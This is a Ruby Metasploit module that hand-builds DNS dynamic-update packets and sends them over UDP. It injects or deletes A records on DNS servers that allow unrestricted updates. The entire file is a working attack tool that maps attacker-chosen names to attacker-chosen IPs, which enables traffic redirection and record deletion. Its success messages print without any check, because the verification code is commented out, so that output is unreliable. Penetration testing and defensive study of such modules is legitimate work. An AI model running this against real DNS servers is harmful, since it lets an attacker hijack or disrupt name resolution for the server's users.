# -*- coding: binary -*-
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'net/dns'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp

  def initialize
    super(
        'Name'           => 'DNS Server Dynamic Update Record Injection',
        'Description'    => %q{
        This module allows adding and/or deleting a record to
        any remote DNS server that allows unrestricted dynamic updates.},
        'Author'         => [ 'King Sabri <king.sabri[at]gmail.com>' ],
        'References'     =>
            [
                ['URL', 'http://www.tenable.com/plugins/index.php?view=single&id=35372'],
                ['URL', 'https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject'],
                ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/'],
                ['URL', 'https://github.com/ChrisTruncer/PenTestScripts/blob/master/DNSInject.py']
            ],
        'License'        => MSF_LICENSE,
        'Actions'        =>
            [
                ['ADD',  {'Description' => 'Add a new record. [Default]'}],
                ['DEL',  {'Description' => 'Delete an existing record.'}]
            ],
        'DefaultAction' => 'ADD'
    )
    register_options(
        [
            OptString.new('DOMAIN', [true, 'The domain name']),
            OptAddress.new('NS', [true, 'The vulnerable DNS server IP address']),
            OptString.new('INJECTDOMAIN', [true, 'The name record you want to inject']),
            OptAddress.new('INJECTIP', [true, 'The IP you want to assign to the injected record']),
        ], self.class)

    register_advanced_options(
        [
            Opt::RPORT(53),
            OptInt.new('TIMEOUT', [false, 'DNS TIMEOUT', 8]),
            OptInt.new('RETRY', [false, 'Number of times to try to resolve a record if no response is received', 2]),
            OptInt.new('RETRY_INTERVAL', [false, 'Number of seconds to wait before doing a retry', 2]),
            OptBool.new('TCP_DNS', [false, 'Run queries over TCP', false])
        ], self.class)

    deregister_options( 'RHOST', 'RPORT' )

  end


  # DNS protocol converts domain to string_size+\x03+binary_string. eg. rubyfu.net = \x06rubyfu\x03net
  def domain_to_raw(domain_name)
    domain_name.split('.').map do |part|
      part_size  = '%02x' % part.size
      domain2hex = part.each_byte.map{|byte| '%02x' %  byte}.join
      part_size + domain2hex
    end.join.scan(/../).map { |x| x.hex.chr }.join
  end

  # Converts IP address to hex format with eliminating the Dots as DNS protocol does.
  def ip_to_hex(ip_addr)
    ip_addr.split(".").map(&:to_i).pack("C*")
  end

  #
  # Build the DNS update A record query
  #
  def build_a_record(action, domain, attacker_domain, attacker_ip)
    case
      when action == 'ADD'
        _type    = "\x00\x01"           # Type: A (Host Address (0x01)
        _class   = "\x00\x01"           # Class: IN (0x0001)
        _ttl     = "\x00\x00\x00\x78"   # Time to live (120)
        _datalen = "\x00\x04"           # Data length (0x0000)
      when action == 'DEL'
        _type    = "\x00\xff"           # Type: A request for all records (0x00ff)
        _class   = "\x00\xff"           # Class: ANY (0x00ff)
        _ttl     = "\x00\x00\x00\x00"   # Time to live (0x0000)
        _datalen = "\x00\x00"           # Data length (0x0000)
    end

    #
    # Dynamic Update Query builder
    #

    # Transaction ID: 0x0000
    "\x00\x00" +
    # Flags: 0x2800 Dynamic update
    "\x28\x00" +
    # Zones: 1
    "\x00\x01" +
    # Prerequisites: 0
    "\x00\x00" +
    # Updates: 1
    "\x00\x01" +
    # Additional RRs: 0
    "\x00\x00" +
    # Zone
    #   <DOMAIN>: type SOA, class IN
    #   Name: <DOMAIN> & [Name Length: 8] & [Label Count: 2]
    domain_to_raw(domain) + "\x00" +
    #   Type: SOA (Start Of a zone of Authority) (6)
    "\x00\x06" +
    #   Class: IN (0x0001)
    "\x00\x01" +

    # Updates
    #   <ATTACKER_DOMAIN>: type A, class IN, addr <ATTACKER_DOMAIN>
    #   Name: <ATTACKER_DOMAIN>
    domain_to_raw(attacker_domain) + "\x00" +
    #   Type: _type
    _type +
    #   Class: _class
    _class +
    #   Time to live: _ttl
    _ttl +
    #   Data length: _datalen
    _datalen +
    #   Address: <ATTACKER_IP>
    ip_to_hex(attacker_ip)
  end

  def send_udp
    datastore['RHOST'] = datastore['NS']
    datastore['RPORT'] = 53
    connect_udp

    # Send UDP packet
    udp_sock.puts(
        # Build DNS query
        build_a_record(
            action.name,
            datastore['DOMAIN'],
            datastore['INJECTDOMAIN'],
            datastore['INJECTIP']
        )
    )
  end

  def run

    print_status("Sending DNS query payload...")
    send_udp

    # @res = Net::DNS::Resolver.new
    # @res.retry = datastore['RETRY'].to_i
    # @res.retry_interval = datastore['RETRY_INTERVAL'].to_i
    # query = @res.query(datastore['INJECTDOMAIN'], Net::DNS::A)
    # print_status "#{query.methods}"

    case
      when action.name == 'ADD'
        # resolve = ::Net::DNS::Resolver.start(datastore['INJECTDOMAIN']).answer.first.address.to_s
        # if resolve == datastore['INJECTIP']
        print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
      # else
      #   print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable.")
      # end

      when action.name == 'DEL'
        # resolve = ::Net::DNS::Resolver.start(datastore['INJECTDOMAIN']).answer.first.address.to_s
        # if resolve.nil?
        print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been deleted!")
      # else
      #   print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
      # end
    end

  end

end
